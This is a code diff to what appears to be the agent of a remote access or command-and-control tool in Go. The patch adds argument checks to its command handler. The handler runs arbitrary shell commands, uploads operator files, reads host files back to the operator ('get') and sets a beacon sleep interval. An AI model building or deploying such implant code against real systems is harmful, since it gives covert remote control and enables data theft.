@@ -81,16 +81,18 @@ func main() {
 func execCommand(command string, i int) (response string) {
 
 	separateCommand := helpers.CommandsSplit(command)
-	baseCommando := separateCommand[0]
+	baseCommand := separateCommand[0]
 
-	switch baseCommando {
+	switch baseCommand {
 	case "ls":
 		response = listFiles()
 	case "pwd":
 		response = listCurrentDirectory()
 	case "cd":
-		if len(separateCommand[1]) > 0 {
+		if len(separateCommand) > 1 && len(separateCommand[1]) > 0 {
 			response = changeDirectory(separateCommand[1])
+		} else {
+			response = "Usage: cd <directory>"
 		}
 	case "whoami":
 		response = whoami()
@@ -99,11 +101,19 @@ func execCommand(command string, i int) (response string) {
 	case "send":
 		response = saveFile(message.Commands[i].File)
 	case "get":
-		response = sendFile(message.Commands[i].Request, i)
+		if len(separateCommand) > 1 && len(separateCommand[1]) > 0 {
+			response = sendFile(command, i)
+		} else {
+			response = "Usage: get <file>"
+		}
 	case "sleep":
-		time := strings.TrimSpace(separateCommand[1])
-		heartBeat, _ = strconv.Atoi(time)
-		response = "Current sleep: " + time + " seconds"
+		if len(separateCommand) > 1 {
+			time := strings.TrimSpace(separateCommand[1])
+			heartBeat, _ = strconv.Atoi(time)
+			response = "Current sleep: " + time + " seconds"
+		} else {
+			response = "Usage: sleep <seconds>"
+		}
 	default:
 		response = shellExecution(command)
 	}
@@ -184,15 +194,20 @@ func sendFile(fullCommand string, i int) (resp string) {
 
 	separateCommand := helpers.CommandsSplit(fullCommand)
 
-	var err error
-	message.Commands[i].File.Content, err = os.ReadFile(separateCommand[1])
+	if len(separateCommand) > 1 && len(separateCommand[1]) > 0 {
+		var err error
+		message.Commands[i].File.Content, err = os.ReadFile(separateCommand[1])
 
-	if err != nil {
-		resp = "Open file error: " + err.Error()
+		if err != nil {
+			resp = "Open file error: " + err.Error()
+			message.Commands[i].File.Error = true
+		}
+
+		message.Commands[i].File.Name = separateCommand[1]
+	} else {
+		resp = "Usage: get <file>"
 		message.Commands[i].File.Error = true
 	}
-
-	message.Commands[i].File.Name = separateCommand[1]
 
 	return resp
 }
